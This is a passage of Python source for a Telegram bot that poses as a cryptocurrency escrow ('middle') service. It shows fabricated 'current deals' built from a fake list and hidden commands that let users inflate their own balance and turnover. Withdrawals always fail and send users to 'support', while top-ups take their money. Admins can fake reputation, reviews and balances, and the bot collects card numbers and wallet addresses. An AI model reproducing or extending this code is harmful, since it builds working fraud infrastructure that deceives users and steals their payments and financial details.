        f"<b>Репутация: {u.get('reputation',0)}</b>\n"
        f"<b>Сделок: {u.get('deals_count',0)}</b>\n"
        f"<b>Оборот: {u.get('turnover',0.0)}$</b>\n\n"
        f"<b>Отзывы:</b>\n{rev_text}\n\n"
        f"<b>/neptune_add 100</b> — добавить баланс\n"
        f"<b>/neptune_sub 50</b> — снять баланс",
        parse_mode="HTML"
    )

@dp.message(Command("neptune_add"))
async def cmd_neptune_add(message: Message):
    uid = message.from_user.id
    get_user(uid)
    try:
        amount = float(message.text.strip().split()[1])
        u = get_user(uid)
        u["balance"]  = round(u.get("balance",0.0) + amount, 2)
        u["turnover"] = round(u.get("turnover",0.0) + amount, 2)
        await message.answer(f"<b>+{amount} | Баланс: {u['balance']}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>/neptune_add 100</b>", parse_mode="HTML")

@dp.message(Command("neptune_sub"))
async def cmd_neptune_sub(message: Message):
    uid = message.from_user.id
    get_user(uid)
    try:
        amount = float(message.text.strip().split()[1])
        u = get_user(uid)
        u["balance"] = round(max(0.0, u.get("balance",0.0) - amount), 2)
        await message.answer(f"<b>-{amount} | Баланс: {u['balance']}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>/neptune_sub 50</b>", parse_mode="HTML")

# ── menu ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "menu")
async def cb_menu(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await state.clear()
    await safe_del(callback.message)
    await show_menu(callback.message, uid)
    await callback.answer()

# ── language ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "language")
async def cb_language(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_choose"), parse_mode="HTML", reply_markup=language_kb())
    await callback.answer()

@dp.callback_query(F.data.startswith("setlang_"))
async def cb_setlang(callback: CallbackQuery):
    uid  = callback.from_user.id
    lang = callback.data.replace("setlang_","")
    if lang not in LANGS: lang = "ru"
    get_user(uid)["lang"] = lang
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_set"), parse_mode="HTML")
    await show_menu(callback.message, uid)
    await callback.answer()

# ── security ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "security")
async def cb_security(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(
        L(uid,"security"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=L(uid,"btn_why_safe"), url=SAFETY_PAGE)],
            [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
        ])
    )
    await callback.answer()

# ── current deals ─────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "cur_deals")
async def cb_cur_deals(callback: CallbackQuery):
    uid   = callback.from_user.id
    text  = L(uid, "cur_deals_title")
    fake  = random.sample(FAKE_DEALS, min(5, len(FAKE_DEALS)))
    pool  = ["u***r","a***x","m***e","s***n","k***v","d***o","p***l","t***s"]
    for i, d in enumerate(fake, 1):
        b = random.choice(pool)
        s = random.choice([n for n in pool if n != b])
        text += L(uid, "cur_deal_line", num=i, amount=d["amount"],
                  desc=d["desc"], buyer=f"@{b}", seller=f"@{s}")
    await safe_del(callback.message)
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

# ── DEAL FLOW ─────────────────────────────────────────────────────────────────
# Порядок: соглашение → роль → партнёр → предмет → суть → оплата → сумма

@dp.callback_query(F.data == "deal")
async def cb_deal(callback: CallbackQuery):
    uid = callback.from_user.id
    # Проверяем наличие хотя бы одного реквизита
    u = get_user(uid)
    has_any = any([u.get("ton_wallet"), u.get("usdt_wallet"), u.get("stars_username"),
                   u.get("card_number"), u.get("btc_wallet"), u.get("eth_wallet")])
    await safe_del(callback.message)
    if not has_any:
        await callback.message.answer(
            L(uid, "no_req_at_all"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_req"), callback_data="requisites")],
                [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
            ])
        )
        await callback.answer()
        return
    await callback.message.answer(L(uid,"agreement"), parse_mode="HTML", reply_markup=agreement_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "confirm_agreement")
async def cb_confirm(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_s0_role"), parse_mode="HTML", reply_markup=role_kb(uid))
    await state.set_state(Deal.role)
    await callback.answer()

@dp.callback_query(F.data.startswith("drole_"), Deal.role)
async def cb_deal_role(callback: CallbackQuery, state: FSMContext):
    uid  = callback.from_user.id
    role = "buyer" if callback.data == "drole_buyer" else "seller"
    await state.update_data(role=role)
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_s1_partner"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.partner)
    await callback.answer()

@dp.message(Deal.partner)
async def deal_partner(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    text = message.text.strip()
    if not text.startswith("@"):
        await message.answer(L(uid,"invalid_username"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    await state.update_data(partner=text)
    await message.answer(L(uid,"deal_s2_subject"), parse_mode="HTML", reply_markup=subject_kb(uid))
    await state.set_state(Deal.subject)

@dp.callback_query(F.data.startswith("dsubj_"), Deal.subject)
async def deal_subject(callback: CallbackQuery, state: FSMContext):
    uid     = callback.from_user.id
    subject = callback.data.replace("dsubj_","")
    await state.update_data(subject=subject)
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_s3_desc"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.description)
    await callback.answer()

@dp.message(Deal.description)
async def deal_desc(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    if len(message.text.strip()) < 8:
        await message.answer(L(uid,"deal_s3_desc_short"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    await state.update_data(description=message.text.strip())
    data = await state.get_data()
    role = data.get("role","seller")
    key  = "deal_s4_payment_seller" if role == "seller" else "deal_s4_payment_buyer"
    await message.answer(L(uid, key), parse_mode="HTML", reply_markup=payment_kb(uid))
    await state.set_state(Deal.payment)

@dp.callback_query(F.data.startswith("dpay_"), Deal.payment)
async def deal_payment(callback: CallbackQuery, state: FSMContext):
    uid     = callback.from_user.id
    method  = callback.data.replace("dpay_","")
    # Проверяем реквизит для выбранного метода
    if not has_req_for(uid, method):
        await safe_del(callback.message)
        await callback.message.answer(
            L(uid, "no_req_for_payment", method=method), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_req"), callback_data="requisites")],
                [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
            ])
        )
        await state.clear()
        await callback.answer()
        return
    await state.update_data(payment=method)
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_s5_amount"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(Deal.amount)
    await callback.answer()

@dp.message(Deal.amount)
async def deal_amount(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    data    = await state.get_data()
    deal_id = gen_deal_id()
    role    = data.get("role","seller")
    deals[deal_id] = {
        "uid":          uid,
        "partner":      data.get("partner","-"),
        "subject":      data.get("subject","-"),
        "description":  data.get("description","-"),
        "amount":       message.text.strip(),
        "payment":      data.get("payment","-"),
        "creator_role": role,
        "status":       "active"
    }
    get_user(uid)["deals_count"] += 1

    me       = await bot.get_me()
    ru_role  = L(uid,"role_seller") if role=="seller" else L(uid,"role_buyer")

    await message.answer(
        L(uid,"deal_created",
          deal_id=deal_id,
          partner=data.get("partner","-"),
          subject=data.get("subject","-"),
          description=data.get("description","-"),
          amount=message.text.strip(),
          payment=data.get("payment","-"),
          role=ru_role,
          bot_username=me.username),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{_M.lstrip('@')}")],
            [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
        ])
    )

    uname = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"
    for adm in ADMIN_IDS:
        try:
            await bot.send_message(
                adm,
                f"<b>Новая сделка {deal_id}</b>\n\n"
                f"<b>Создатель: {uname} ({ru_role})</b>\n"
                f"<b>Партнёр: {data.get('partner','-')}</b>\n"
                f"<b>Предмет: {data.get('subject','-')}</b>\n"
                f"<b>Суть: {data.get('description','-')}</b>\n"
                f"<b>Сумма: {message.text.strip()} | Оплата: {data.get('payment','-')}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass
    await state.clear()

# ── paid ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data.startswith("paid_"))
async def cb_paid(callback: CallbackQuery):
    uid     = callback.from_user.id
    deal_id = callback.data.replace("paid_","")
    uname   = f"@{callback.from_user.username}" if callback.from_user.username else f"ID:{uid}"

    if deal_id == "topup":
        for adm in ADMIN_IDS:
            try:
                await bot.send_message(adm,
                    f"<b>Пополнение\n\nПользователь: {uname} (ID:{uid})</b>", parse_mode="HTML")
            except Exception: pass
        await callback.answer("Уведомление отправлено!", show_alert=True)
        await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))
        return

    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена", show_alert=True); return

    for adm in ADMIN_IDS:
        try:
            await bot.send_message(adm,
                L(adm,"paid_notify_admin", deal_id=deal_id, user=uname,
                  amount=deal.get("amount","-"), payment=deal.get("payment","-")),
                parse_mode="HTML")
        except Exception: pass

    creator_uid = deal.get("uid")
    if creator_uid and creator_uid != uid:
        try:
            await bot.send_message(creator_uid,
                L(creator_uid,"paid_notify_seller", deal_id=deal_id), parse_mode="HTML")
        except Exception: pass

    await callback.answer("Уведомление отправлено!", show_alert=True)
    await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))

# ── requisites ───────────────────────────────────────────────────────────────

async def _start_req(uid, req_type, state, message, from_deal=False):
    key_map = {
        "ton":   "enter_ton",   "usdt":  "enter_usdt",
        "stars": "enter_stars", "card":  "enter_card_num",
        "btc":   "enter_btc",   "eth":   "enter_eth",
    }
    st_map = {
        "ton":   AddReq.ton,   "usdt":  AddReq.usdt,
        "stars": AddReq.stars, "card":  AddReq.card_num,
        "btc":   AddReq.btc,   "eth":   AddReq.eth,
    }
    uid_l = uid if isinstance(uid, int) else uid
    await message.answer(L(uid_l, key_map[req_type]), parse_mode="HTML",
                         reply_markup=cancel_kb(uid_l))
    await state.set_state(st_map[req_type])
    await state.update_data(from_deal=from_deal)

@dp.callback_query(F.data == "requisites")
async def cb_req(callback: CallbackQuery):
    uid = callback.from_user.id
    u   = get_user(uid)
    await safe_del(callback.message)
    await callback.message.answer(
        L(uid,"req_title",
          ton=u.get("ton_wallet") or "-",
          usdt=u.get("usdt_wallet") or "-",
          stars=u.get("stars_username") or "-",
          card=u.get("card_number") or "-",
          card_name=u.get("card_name") or "-",
          btc=u.get("btc_wallet") or "-",
          eth=u.get("eth_wallet") or "-"),
        parse_mode="HTML", reply_markup=req_kb(uid)
    )
    await callback.answer()

@dp.callback_query(F.data.in_({"req_ton","req_usdt","req_stars","req_card","req_btc","req_eth"}))
async def cb_req_type(callback: CallbackQuery, state: FSMContext):
    uid      = callback.from_user.id
    req_type = callback.data.replace("req_","")
    await safe_del(callback.message)
    await _start_req(uid, req_type, state, callback.message)
    await callback.answer()

@dp.message(AddReq.ton)
async def save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    addr = message.text.strip()
    if not valid_ton(addr):
        await message.answer(L(uid,"req_ton_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid)); return
    get_user(uid)["ton_wallet"] = addr
    data = await state.get_data(); await state.clear()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid,"saved_ton") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.usdt)
async def save_usdt(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    get_user(uid)["usdt_wallet"] = message.text.strip()
    data = await state.get_data(); await state.clear()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid,"saved_usdt") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.stars)
async def save_stars(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    uname = message.text.strip()
    if not uname.startswith("@"): uname = "@" + uname
    get_user(uid)["stars_username"] = uname
    data = await state.get_data(); await state.clear()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid,"saved_stars") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.card_num)
async def save_card_num(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    num = message.text.strip()
    if not valid_card(num):
        await message.answer(L(uid,"req_card_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid)); return
    await state.update_data(card_number=num)
    await message.answer(L(uid,"req_card_step2"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card_name)

@dp.message(AddReq.card_name)
async def save_card_name(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    data = await state.get_data()
    get_user(uid).update({"card_number": data.get("card_number",""), "card_name": message.text.strip()})
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"saved_card") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.btc)
async def save_btc(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    get_user(uid)["btc_wallet"] = message.text.strip()
    data = await state.get_data(); await state.clear()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid,"saved_btc") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.eth)
async def save_eth(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    get_user(uid)["eth_wallet"] = message.text.strip()
    data = await state.get_data(); await state.clear()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await message.answer(L(uid,"saved_eth") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

# ── top-up ───────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "topup")
async def cb_topup(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_title"), parse_mode="HTML", reply_markup=topup_kb(uid))
    await callback.answer()

@dp.callback_query(F.data.in_({"topup_stars","topup_ton","topup_card"}))
async def cb_topup_method(callback: CallbackQuery, state: FSMContext):
    uid    = callback.from_user.id
    method = callback.data.replace("topup_","")
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method=method)
    await callback.answer()

@dp.callback_query(F.data == "topup_nft")
async def cb_topup_nft(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_nft"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()

@dp.message(TopUp.amount)
async def topup_amount(message: Message, state: FSMContext):
    uid = message.from_user.id; reg(message); await safe_del(message)
    raw = message.text.strip().replace(",",".")
    try:
        amount = float(raw)
        if amount <= 0: raise ValueError
    except ValueError:
        await message.answer(L(uid,"topup_amount_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid)); return
    data   = await state.get_data()
    method = data.get("topup_method","ton")
    await state.clear()
    amt_str = str(int(amount)) if amount == int(amount) else str(amount)
    await message.answer(L(uid,f"topup_{method}", amount=amt_str),
                         parse_mode="HTML", reply_markup=topup_paid_kb(uid))

# ── withdraw ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "withdraw")
async def cb_withdraw(callback: CallbackQuery):
    uid     = callback.from_user.id
    balance = get_user(uid).get("balance", 0.0)
    await safe_del(callback.message)
    if balance <= 0:
        await callback.message.answer(
            L(uid,"withdraw_no_funds"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_topup"),  callback_data="topup")],
                [InlineKeyboardButton(text=L(uid,"btn_back"),   callback_data="menu")],
            ]))
    else:
        await callback.message.answer(
            L(uid,"withdraw_error"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_support"), url=f"https://t.me/{_S.lstrip('@')}")],
                [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
            ]))
    await callback.answer()

# ── admin ────────────────────────────────────────────────────────────────────

@dp.message(Command("adm"))
async def cmd_adm(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len([k for k in user_data if not str(k).startswith("_")])
    await message.answer(
        f"<b>Админ-панель</b>\n\n<b>Пользователей: {total}\nСделок: {len(deals)}</b>",
        parse_mode="HTML", reply_markup=admin_kb())

@dp.callback_query(F.data == "adm_banner")
async def adm_banner(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await safe_del(callback.message)
    await callback.message.answer(
        "<b>Отправьте фото + подпись для баннера.\nБаннер будет показываться при каждом открытии меню.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(SetBanner.waiting)
    await callback.answer()

@dp.message(SetBanner.waiting, F.photo)
async def save_banner(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    user_data["_banner"] = {"photo_id": message.photo[-1].file_id, "caption": message.caption or ""}
    await safe_del(message)
    await message.answer("<b>Баннер обновлён!</b>", parse_mode="HTML", reply_markup=admin_kb())
    await state.clear()

@dp.callback_query(F.data == "adm_stats")
async def adm_stats(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    total    = len([k for k in user_data if not str(k).startswith("_")])
    with_req = len([v for k,v in user_data.items()
                    if not str(k).startswith("_") and isinstance(v,dict) and v.get("has_requisites")])
    active   = len([d for d in deals.values() if d.get("status")=="active"])
    turnover = sum(v.get("turnover",0.0) for k,v in user_data.items()
                   if not str(k).startswith("_") and isinstance(v,dict))
    await callback.message.answer(
        f"<b>Статистика\n\nПользователей: {total}\nС реквизитами: {with_req}\n"
        f"Сделок: {len(deals)}\nАктивных: {active}\nОборот: {turnover}$</b>",
        parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    ulist = [k for k in user_data if not str(k).startswith("_")]
    text  = f"<b>Пользователи ({len(ulist)})</b>\n\n"
    for uid in ulist[:20]:
        u = user_data[uid]
        if not isinstance(u,dict): continue
        text += (f"<b><code>{uid}</code> rep:{u.get('reputation',0)} "
                 f"deals:{u.get('deals_count',0)} bal:{u.get('balance',0.0)} "
                 f"{u.get('lang','ru')}</b>\n")
    if len(ulist) > 20: text += f"<b>...ещё {len(ulist)-20}</b>"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_reputation")
async def adm_rep(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Репутация\n\nФормат: @username +5</b>", parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.reputation)
    await callback.answer()

@dp.message(AdminAction.reputation)
async def process_rep(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split()
        uid   = find_uid(parts[0])
        if uid is None: await message.answer("<b>Не найден.</b>", parse_mode="HTML"); await state.clear(); return
        delta = int(parts[1])
        u = get_user(uid); u["reputation"] = u.get("reputation",0) + delta
        await message.answer(f"<b>{uid}: {delta:+} | Итого: {u['reputation']}</b>", parse_mode="HTML")
        await bot.send_message(uid, f"<b>Репутация: {delta:+} | Текущая: {u['reputation']}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка. Формат: @username +5</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_review")
async def adm_review(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Отзыв\n\nФормат: @username Текст</b>", parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.review)
    await callback.answer()

@dp.message(AdminAction.review)
async def process_review(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split(maxsplit=1)
        uid   = find_uid(parts[0])
        if uid is None: await message.answer("<b>Не найден.</b>", parse_mode="HTML"); await state.clear(); return
        get_user(uid).setdefault("reviews",[]).append(parts[1])
        await message.answer(f"<b>Отзыв добавлен {uid}</b>", parse_mode="HTML")
        await bot.send_message(uid, f"<b>Новый отзыв:\n\n{parts[1]}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка.</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_balance")
async def adm_bal(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Баланс\n\nФормат: @username 150.5</b>", parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]]))
    await state.set_state(AdminAction.balance)
    await callback.answer()

@dp.message(AdminAction.balance)
async def process_bal(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts  = message.text.strip().split()
        uid    = find_uid(parts[0])
        if uid is None: await message.answer("<b>Не найден.</b>", parse_mode="HTML"); await state.clear(); return
        amount = float(parts[1]); u = get_user(uid); old = u.get("balance",0)
        u["balance"] = amount
        await message.answer(f"<b>{uid}: {old} → {amount}</b>", parse_mode="HTML")
        await bot.send_message(uid, f"<b>Баланс обновлён: {amount}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка.</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_deals")
async def adm_deals_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    if not deals:
        await callback.message.answer("<b>Сделок нет.</b>", parse_mode="HTML"); await callback.answer(); return
    text = f"<b>Сделки ({len(deals)})</b>\n\n"
    for did, d in list(deals.items())[-10:]:
        text += (f"<b><code>{did}</code> | {d['uid']} | {d.get('partner','-')}\n"
                 f"{d['amount']} {d.get('payment','-')} | {d['description'][:25]}\nСтатус: {d['status']}</b>\n\n")
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_cancel")
async def adm_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer("<b>Отменено.</b>", parse_mode="HTML", reply_markup=admin_kb())
    await callback.answer()

# ── run ──────────────────────────────────────────────────────────────────────

async def set_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Главное меню / Main menu"),
    ])

async def main():
    await set_commands()
    print("Crypto Middle Bot запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
